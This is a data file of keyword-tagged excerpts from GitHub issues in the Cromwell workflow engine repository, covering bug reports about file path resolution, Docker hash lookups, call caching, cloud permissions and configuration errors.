Security,"When an optional file input is given to a task, the file path is not resolved to the local path in the JES backend. Non-optional Files are resolved appropriately. . Example failing task:; ```; task ValidateSamFile {; File input_bam; File? ref_fasta. command {; java -Xmx4000m -jar /usr/gitc/picard.jar \; BlahBlahThisIsACommand \; INPUT=${input_bam} \; ${""REFERENCE_SEQUENCE="" + ref_fasta}; }; runtime {; docker: ""broadinstitute/genomes-in-the-cloud:2.2.4-1469632282""; memory: ""7 GB""; disks: ""local-disk "" + disk_size + "" HDD""; preemptible: preemptible_tries; }; output {; File report = ""${report_filename}""; }; }; ```. Output from stderr:; ```; Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell_root/tmp; [Mon Jan 23 17:32:28 UTC 2017] picard.sam. BlahBlahThisIsACommand INPUT=/cromwell_root/broad-dsde-methods/cromwell-execution-24/PairedEndSingleSampleWorkflow/5802ded7-ba93-4186-b680-5a7cb2c7f62c/call-SortAndFixReadGroupBam/shard-1/H06HDADXX130110.2.ATCACGAT.20k_reads.sorted.bam \; REFERENCE_SEQUENCE=gs:/broad-references/hg38/v0/Homo_sapiens_assembly38.fasta ; [Mon Jan 23 17:32:28 UTC 2017] Executing as root@4543b0496fa1 on Linux 3.16.0-0.bpo.4-amd64 amd64; OpenJDK 64-Bit Server VM 1.8.0_91-8u91-b14-1~bpo8+1-b14; Picard version: 2.5.0-gradle-SNAPSHOT; [Mon Jan 23 17:32:28 UTC 2017] picard.sam.ValidateSamFile done. Elapsed time: 0.00 minutes.; Runtime.totalMemory()=119013376; To get help, see http://broadinstitute.github.io/picard/index.html#GettingHelp; Exception in thread ""main"" htsjdk.samtools.SAMException: Cannot read non-existent file: /cromwell_root/gs:/broad-references/hg38/v0/Homo_sapiens_assembly38.fasta; 	at htsjdk.samtools.util.IOUtil.assertFileIsReadable(IOUtil.java:338); 	at htsjdk.samtools.util.IOUtil.assertFileIsReadable(IOUtil.java:325); 	at picard.sam.ValidateSamFile.doWork(ValidateSamFile.java:141); 	at picard.cmdline.CommandLineProgram.instanceMain(CommandLineProgram.java:208); 	at picard.cmdline.PicardCommandLine.instanceMain(PicardCommandLine.java:95); 	",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1891:198,Validat,ValidateSamFile,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1891,1,['Validat'],['ValidateSamFile']
Security,When encrypted fields are specified in the application.conf they're not being encrypted in the DB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/999:5,encrypt,encrypted,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/999,2,['encrypt'],['encrypted']
Security,"When rebasing and resolving conflicts this PR will need to be rewired, starting with:. ```scala; object JesRuntimeAttributes {; val runtimeAttributesBuilder: StandardValidatedRuntimeAttributesBuilder = …. private val zonesValidation: RuntimeAttributesValidation[Vector[String]] =; ZonesValidation.withDefault(WdlString(ZoneDefaultValue)). def apply(validatedRuntimeAttributes: ValidatedRuntimeAttributes): JesRuntimeAttributes = …; ```. converted to:. ```scala; object JesRuntimeAttributes {; def runtimeAttributesBuilder(jesConfiguration: JesConfiguration): StandardValidatedRuntimeAttributesBuilder = . private def zonesValidation(defaultZones: NonEmptyList[String]): RuntimeAttributesValidation[Vector[String]] =; ZonesValidation.withDefault(WdlString(defaultZones.toList.mkString("",""))). def apply(validatedRuntimeAttributes: ValidatedRuntimeAttributes,; jesConfiguration: JesConfiguration): JesRuntimeAttributes = …; ```. This should be fine for plumbing from the main code, as each caller has a jesConfiguration. The test code may need some refactoring and/or mocks-- or the JRA object can add overloads, that in addition to receiving jesConfigurations, can take a nel of default zones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-271135773:349,validat,validatedRuntimeAttributes,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-271135773,4,"['Validat', 'validat']","['ValidatedRuntimeAttributes', 'validatedRuntimeAttributes']"
Security,"When running a docker image through Cromwell, it assumes that you are the root user for the docker container. I was trying to run a docker image which has to be run as a non-root user, so they don't have access to the root user home folder (/root). The problem with this is that Cromwell will place any files you pass to the container in the /root directory, so you need to be the root user or else you will get a permission error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/472:204,access,access,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/472,1,['access'],['access']
Security,"When running the official Broad workflows (for example [this one](https://github.com/gatk-workflows/gatk3-data-processing)), on Cromwell 36 setup on AWS, I get the following error:. ```; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk' or '/mount/point' but got: 'local-disk 100 HDD'; at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); at ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4274:215,validat,validation,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4274,10,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validatedRuntimeAttributes', 'validation']"
Security,"When testing our workflow, we are seeing variations in some calculations based on the cpu architecture chosen for a VM. In PAPI V1, we worked around this issue by restricting the test to only run in a single region. This caused the same cpu to be used for all of the affected tests, and we were able to easily validate the workflow output. Now that we are testing the workflow under PAPI V2, we are running into the same issue, and setting the region no longer fixes the issue. It looks like the `minCpuPlatform` pipelines API setting would be sufficient for this. See [Specifying a Minimum CPU Platform for VM Instances](https://cloud.google.com/compute/docs/instances/specify-min-cpu-platform). Does this sound like a reasonable feature to add to cromwell's PAPI V2 support?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4608:310,validat,validate,310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4608,1,['validat'],['validate']
Security,"When the 'docker' runtime attribute of a task is specified with the sha256 hash, as in; runtime {; docker: ""quay.io/broadinstitute/viral-ngs:1.22.0@sha256:be458fe91e176102c9c8e2933c9ff430d899a0ec8f919939cbdb26f2d4c7d4be""; }; Cromwell reports exceptions such as; 2019-04-28 04:40:08,146 cromwell-system-akka.dispatchers.engine-dispatcher-39 WARN - BackendPreparationActor_for_d5800039:assemble_de\; novo_with_deplete.deplete_taxa:-1:1 [UUID(d5800039)]: Docker lookup failed; java.lang.Exception: Docker image quay.io/broadinstitute/viral-ngs@sha256:be458fe91e176102c9c8e2933c9ff430d899a0ec8f919939cbdb26f2d4c7\; d4be not found; at cromwell.engine.workflow.WorkflowDockerLookupActor.cromwell$engine$workflow$WorkflowDockerLookupActor$$handleLookupFailure(\; WorkflowDockerLookupActor.scala:194); at cromwell.engine.workflow.WorkflowDockerLookupActor$$anonfun$3.applyOrElse(WorkflowDockerLookupActor.scala:86); at cromwell.engine.workflow.WorkflowDockerLookupActor$$anonfun$3.applyOrElse(WorkflowDockerLookupActor.scala:70); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); at akka.actor.FSM.processEvent(FSM.scala:684); at akka.actor.FSM.processEvent$(FSM.scala:681); at cromwell.engine.workflow.WorkflowDockerLookupActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowDockerLookupActor.scal\; a:37); at akka.actor.LoggingFSM.processEvent(FSM.scala:820); at akka.actor.LoggingFSM.processEvent$(FSM.scala:802); at cromwell.engine.workflow.WorkflowDockerLookupActor.processEvent(WorkflowDockerLookupActor.scala:37); at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:678); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:672); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); at cromwell.docker.DockerClientHelper$$anonfun$dockerResponseReceive$1.applyOrElse(DockerClientHelper.scala:16); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4912:75,hash,hash,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4912,1,['hash'],['hash']
Security,"When the WDL specified a hash, we used to not do anything and keep the user-specified value as the string to md5.; We now use the full name of the parsed docker value.; They might be different in a case where the docker is for example ; `ubuntu@sha256:ea1d854d38be82f54d39efe2c67000bed1b03348bcc2f3dc094f260855dff368`. 26 will use this as is where 27 will use ; `library/ubuntu@sha256:ea1d854d38be82f54d39efe2c67000bed1b03348bcc2f3dc094f260855dff368`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2359:25,hash,hash,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2359,1,['hash'],['hash']
Security,"When using MySQL for call caching, I am getting peppered with the message below. I realize that this is technically a MySQL configuration issue, but since it will happen to most cromwell users by default, can we include some documentation to get rid of it?. ```; Tue Oct 18 14:03:44 UTC 2016 WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1591:753,certificate,certificate,753,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1591,1,['certificate'],['certificate']
Security,"When using a docker hash in V25 in order to get call caching I get the following error: . ```; 2017-05-01 18:06:39 [cromwell-system-akka.actor.default-dispatcher-3670] ERROR c.e.w.l.e.EngineJobExecutionActor - Failed copying cache results for job GenotypeGVCFsComparison.IndexVCF:-1:1, invalidating cache entry.; java.io.IOException: Failed to copy gs://dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz to gs://broad-dsde-methods/cromwell-execution-25/GenotypeGVCFsComparison/c5bc4f99-d969-49ca-9e2e-a3dac7a4b12a/call-IndexVCF/dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz; 	at cromwell.core.path.PathCopier$$anonfun$copy$2.applyOrElse(PathCopier.scala:49); 	at cromwell.core.path.PathCopier$$anonfun$copy$2.applyOrElse(PathCopier.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.core.path.PathCopier$.copy(PathCopier.scala:48); 	at cromwell.backend.standard.StandardCacheHitCopyingActor.duplicate(StandardCacheHitCopyingActor.scala:36); 	at cromwell.backend.callcaching.CacheHitDuplicating$$anonfun$copySimpletons$1.apply(CacheHitDuplicating.scala:66); 	at cromwell.backend.callcaching.CacheHitDuplicating$$anonfun$copySimpletons$1.apply(CacheHitDuplicating.scala:62); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:20,hash,hash,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['hash'],['hash']
Security,"When using aws batch feature, the call caching seems no longer work. . I am using cromwell-35.jar, the aws.conf is the following. include required(classpath(""application"")). aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""default""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://mybucket/cromwell-execution""; 	auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes { queueArn = ""arn:aws:batch:us-east-1:<account-id>:job-queue/MyHighPriorityQue-ae4256f76f07d96"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }. call-caching {. enabled = true. # In a multi-user environment this should be false so unauthorized users don't invalidate results for authorized users.; invalidate-bad-cache-results = false. blacklist-cache {; # The call caching blacklist cache is off by default. This is used to blacklist cache hit paths based on the; # prefixes of cache hit paths that Cromwell previously failed to copy for authorization reasons.; enabled: false; # Guava cache concurrency.; concurrency: 10000; # How long entries in the cache should live from the time of their last access.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 1000; }; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://cromwell-db-rdscluster.cluster.us-east-1.rds.amazonaws.com/cromwell""; user = ""myuser""; password = ""my password""; connectionTimeout = 5000; }; }. my hello.wdl is:; task hello {; String name; command {; echo 'Hello ${name}!' > ""hello${name}.txt""; }; output {; File response = ""hello${name}.txt""; }; runtime {; docker: ""ubuntu:latest""; }; }. workflow test {; call hello; }. My hello_inputs.json is:; {; ""test.hello.name"": ""World"",; }. I r",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412:949,authoriz,authorized,949,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412,1,['authoriz'],['authorized']
Security,"When using relative path-based imports in a WDL, and imported WDL which also imports a WDL does not look in the right places for relative imports.; For example, given the directory structure:; ```; import_issue; | Issue.wdl; |; a___; | |___A.wdl; |; |___b; |___B.wdl; |; |___c; |___C.wdl; ```; where `Issue.wdl` imports `""a/A.wdl"" as WorkflowA` and `""b/B.wdl"" as WorkflowB` and `B.wdl` imports `import ""b/c/C.wdl"" as CTasks`, Cromwell is able to process and run the WDL in v34, but not in v36. It fails both submission to a Cromwell server and validation in Womtool. Attached is a zip file containing this toy example.; [import_issue.zip](https://github.com/broadinstitute/cromwell/files/2728020/import_issue.zip)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4515:544,validat,validation,544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4515,1,['validat'],['validation']
Security,"When using the Google Backend (PAPIv2) with versions of Cromwell v36+, there is a concern around running the ""delocalize cwl.output.json"" action for WDL workflows, as it only **required** for CWL workflows). The pain points of this behavior (in order of severity) are:; 1. Disallows a user from using the `noAddress` runtime attribute, because now it forces all WDL tasks to have access to DockerHub in order to succeed.; 2. Introduces scope for transient failures, meaning the WDL job fails if the pull for the jq docker image fails. ; 3. Slows down WDL jobs as it unnecessarily pulls the jq image from dockerhub. AC: Don't run the `delocalize cwl.output.json` event for WDL workflows at all.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4426:380,access,access,380,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4426,1,['access'],['access']
Security,"When using the `PAPIv2` backend, I have noticed that the same previous set of roles is not sufficient to be able to run the pipelines. Instead, after a long and tedious amount of work, I have figured that the following set of roles:; 1) [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (`lifesciences.workflowsRunner`); 2) [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (`iam.serviceAccountUser`); 3) [Firebase Develop](https://firebase.google.com/docs/projects/iam/roles-predefined-category#analytics_roles) Admin (`firebase.developAdmin`). are sufficient to run a pipelne on Google Cloud through a service account. I suppose that `lifesciences.workflowsRunner` is a replacement for `genomics.pipelinesRunner`, but I have no idea why `firebase.developAdmin` is required (or what else should be required in its place). To save my life, I could not find this information anywhere in the Cromwell documentation nor evince it from the Cromwell error messages themselves (nor understand what the `firebase.developAdmin` roles actually allows).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680282059:312,access,access-control,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680282059,1,['access'],['access-control']
Security,"When viewing example [conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/PAPIv2.conf) and API [documentation](https://cloud.google.com/life-sciences/docs/concepts/locations), I see that we can use any location for compute itself, but pipeline metadata is stored in one of several locations. How would one change the configuration to run pipelines in e.g. us-east1, while accessing API at us-central1?; I tried some options and I either got improper argument error, or umatched zone/region error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6193:408,access,accessing,408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6193,1,['access'],['accessing']
Security,When we're determining call cache hits we have an issue where we need to pull hashes and compare them to potential hits in our database. Many of these lookups are likely to be failures. It seems like a bloom filter could be a good optimization here (provided the memory tradeoff is worth the time benefit) by filtering out obvious negative results prior to hitting the database.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2248:78,hash,hashes,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2248,1,['hash'],['hashes']
Security,"Whenever SAM returns a successful response the content is JSON. When there's an error, say a `HTTP 500` the SAM response is HTML. However in all cases CromIAM tries to deserialize the response into JSON. The effect is that the original error message is lost producing a stack trace similar to the one below. A/C: SAM errors are reported and/or logged with original/redacted information, and NOT logged with the error below. . ```java; [INFO] [05/14/2018 18:08:50.471] [default-akka.actor.default-dispatcher-5853] [CromIamServer$(akka://default)] Requesting authorization for view access for user [REDACTED] on a request to view for collection [REDACTED]; [ERROR] [05/14/2018 18:08:50.507] [CromIamServer-akka.actor.default-dispatcher-443] [CromIamServer$(akka://default)] Request failed java.lang.RuntimeException: Unable to look up collections for user [REDACTED]: Unsupported Content-Type, supported: application/json; java.lang.RuntimeException: Unable to look up collections for user [REDACTED]: Unsupported Content-Type, supported: application/json; 	at cromiam.webservice.QuerySupport.$anonfun$preprocessQuery$3(QuerySupport.scala:67); 	at akka.http.scaladsl.server.Directive$SingleValueModifiers.$anonfun$flatMap$1(Directive.scala:141); 	at akka.http.scaladsl.server.Directive.$anonfun$tflatMap$2(Directive.scala:69); 	at akka.http.scaladsl.server.directives.FutureDirectives.$anonfun$onComplete$3(FutureDirectives.scala:37); 	at akka.http.scaladsl.util.FastFuture$.$anonfun$transformWith$2(FastFuture.scala:37); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.$anonfun$transformWith$3(FastFuture.scala:52); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3622:557,authoriz,authorization,557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3622,2,"['access', 'authoriz']","['access', 'authorization']"
Security,"While doing some WDL refactoring, we changed a local (relative) import but forgot to rename the imported file to match. When we ran `womtool validate` on the importing workflow, it dumped the following stack trace and then hung:; ```; Exception in thread ""main"" java.net.UnknownHostException: tasks%2FAlignment.wdl: Name or service not known; at java.net.Inet4AddressImpl.lookupAllHostAddr(Native Method); at java.net.InetAddress$2.lookupAllHostAddr(InetAddress.java:928); at java.net.InetAddress.getAddressesFromNameService(InetAddress.java:1323); at java.net.InetAddress.getAllByName0(InetAddress.java:1276); at java.net.InetAddress.getAllByName(InetAddress.java:1192); at java.net.InetAddress.getAllByName(InetAddress.java:1126); at io.netty.util.internal.SocketUtils$9.run(SocketUtils.java:159); at io.netty.util.internal.SocketUtils$9.run(SocketUtils.java:156); at java.security.AccessController.doPrivileged(Native Method); at io.netty.util.internal.SocketUtils.allAddressesByName(SocketUtils.java:156); at io.netty.resolver.DefaultNameResolver.doResolveAll(DefaultNameResolver.java:52); at io.netty.resolver.SimpleNameResolver.resolveAll(SimpleNameResolver.java:81); at io.netty.resolver.SimpleNameResolver.resolveAll(SimpleNameResolver.java:73); at org.asynchttpclient.resolver.RequestHostnameResolver.resolve(RequestHostnameResolver.java:50); at org.asynchttpclient.netty.request.NettyRequestSender.resolveAddresses(NettyRequestSender.java:355); at org.asynchttpclient.netty.request.NettyRequestSender.sendRequestWithNewChannel(NettyRequestSender.java:298); at org.asynchttpclient.netty.request.NettyRequestSender.sendRequestWithCertainForceConnect(NettyRequestSender.java:140); at org.asynchttpclient.netty.request.NettyRequestSender.sendRequest(NettyRequestSender.java:111); at org.asynchttpclient.DefaultAsyncHttpClient.execute(DefaultAsyncHttpClient.java:240); at org.asynchttpclient.DefaultAsyncHttpClient.executeRequest(DefaultAsyncHttpClient.java:209); at org.asynchttpclient.BoundRequ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3977:141,validat,validate,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3977,3,"['Access', 'secur', 'validat']","['AccessController', 'security', 'validate']"
Security,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:78,inject,injects,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851,2,['inject'],"['injected', 'injects']"
Security,"While investigating the Dockerhub outage [0][1] and the Quay outage [2] we found that Cromwell can get into a bad state that interferes with Docker hash lookups. Rebooting Cromwell fixes the problem. On Friday 6/12 I was demoing the repro scenario I've been working on and I mentioned that I can't easily go from a ""broken Quay"" to a ""working Quay"" scenario because I have to restart Cromwell to pick up the DNS change... _restart Cromwell to pick up the DNS change_. _restart Cromwell to pick up the DNS change?_. _restart Cromwell to pick up the DNS change!!!_. Yesterday 6/15 I discovered that the JVM has a DNS cache with an infinite TTL [3]. Lowering this to a reasonable value allowed my test scenario to work without restarting the JVM, which it didn't before. Here is my theory:; 1. A Docker repo starts taking on water and engineers scramble to fix it; 2. They make infrastructure changes that change DNS records.; 3. Cromwell's retained DNS record breaks the ability to communicate with the repo indefinitely, even after the outage is resolved.; 4. Restarting Cromwell clears the cache. [0] https://broadworkbench.atlassian.net/browse/PROD-272; [1] https://broadworkbench.atlassian.net/browse/BA-6070; [2] https://broadworkbench.atlassian.net/browse/BA-6454; [3] https://www.ibm.com/support/pages/gis-dns-cache-never-updates-ip-after-dns-name-ip-changes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5546:148,hash,hash,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5546,1,['hash'],['hash']
Security,"While running a WDL on Google cloud with a very large task array I received the weirdest error:; ```; ""failures"": [; {; ""causedBy"": [],; ""message"": ""Task xxx.xxx:2292:1 failed. The job was stopped before the command finished. PAPI error code 7. Execution failed: generic::permission_denied: pulling image: docker pull: running [\""docker\"" \""pull\"" \""us.gcr.io/mccarroll-mocha/bcftools@sha256:ef8a606bfa1c5cef455dc2b97812f0a7f16d89e2962eee7654457a371462194b\""]: exit status 1 (standard error: \""error pulling image configuration: download failed after attempts=1: error parsing HTTP 403 response body: invalid character '<' looking for beginning of value: \\\""<?xml version='1.0' encoding='UTF-8'?><Error><Code>AccessDenied</Code><Message>Access denied.</Message><Details>We're sorry, but this service is not available in your location</Details></Error>\\\""\\n\"")""; }; ],; ```; And the shard-2292 directory only contained the following files (no `stderr` file):; ```; gcs_delocalization.sh; gcs_localization.sh; gcs_transfer.sh; script; ```; The task array is very large (0-2437) but only three different tasks had this error (1124, 1510, 2292). It seems as if Cromwell tried to pull the docker (`us.gcr.io/mccarroll-mocha/bcftools:1.16-20221221` in this case) from GCR but received a 403 response for some reasons and did not know how to interpret it. When rerunning the pipeline with CallCaching, it continued without issues. My suggestion is that this is a rare failure mode that might only occur for large task arrays and Cromwell needs to interpret the 403 error and retry to pull the docker after a few seconds rather than failing the whole pipeline.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7132:710,Access,AccessDenied,710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132,2,['Access'],"['Access', 'AccessDenied']"
Security,"While testing cromwell-36 with AWS batch I was able to reproduce this error:. ```; 2019-02-25 09:38:52,508 cromwell-system-akka.dispatchers.engine-dispatcher-24 ERROR - WorkflowManagerActor Workflow b6b9322c-3929-4b72-9598-45d97dfb858d failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'print_nach_nachman_meuman.out': [Attempted 1 time(s)] - IOException: Could not read from s3://nrglab-cromwell-genomics/cromwell-execution/run_multiple_tests/b6b9322c-3929-4b72-9598-45d97dfb858d/call-test_cromwell_on_aws/shard-61/SingleTest.test_cromwell_on_aws/f8ecf673-ed61-4b06-b1d6-c20f7efe986e/call-print_nach_nachman_meuman/print_nach_nachman_meuman-stdout.log: Cannot access file: s3://s3.amazonaws.com/nrglab-cromwell-genomics/cromwell-execution/run_multiple_tests/b6b9322c-3929-4b72-9598-45d97dfb858d/call-test_cromwell_on_aws/shard-61/SingleTest.test_cromwell_on_aws/f8ecf673-ed61-4b06-b1d6-c20f7efe986e/call-print_nach_nachman_meuman/print_nach_nachman_meuman-stdout.log; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:867); ```. The error occurs when running many sub-workflows within a single wrapping workflow.; The environment is configured correctly, and the test usually passes when running <30 subworkflows. Here are the workflows:. run_multiple_test.wdl; ```; import ""three_task_sequence.wdl"" as SingleTest. workflow run_multiple_tests {; scatter (i in range(30)){; call SingleTest.three_task_sequence{}; }; }; ```. three_task_sequence.wdl; ```; workflow three_task_sequence{; call print_nach. call print_nach_nachman {; input:; previous = print_nach.out; }. call print_nach_nachman_meuman{; input:; previous = print_nach_nachman.out; }; output{; Array[String] out = print_nach_nachman_meuman.out; }; }. task print_nach{; command{; echo ""nach""; }; output{; Array[String] out = read_lines(stdout()); }; runtime {; 	 docker",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687:758,access,access,758,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687,1,['access'],['access']
